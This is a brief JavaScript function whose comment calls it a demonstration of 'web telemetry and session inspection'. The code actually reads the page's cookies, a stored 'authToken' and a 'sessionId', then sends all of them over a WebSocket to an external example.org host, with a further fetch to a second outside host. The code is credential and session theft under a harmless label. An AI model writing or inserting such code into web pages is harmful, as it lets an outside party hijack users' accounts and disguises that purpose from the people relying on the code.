/**
 * Script demonstrating web telemetry and session inspection
 */
function inspectSession() {
  const cookieData = document.cookie;
  const localItems = localStorage.getItem('authToken');
  const sessionData = sessionStorage.getItem('sessionId');
  const ws = new WebSocket('wss://telemetry.example.org/stream');
  
  fetch('https://telemetry-sink.example.org/api/collect');
  const fn = new Function('return window')();
  
  ws.onopen = () => {
    ws.send(JSON.stringify({ cookieData, localItems, sessionData, fn: String(fn) }));
  };
}
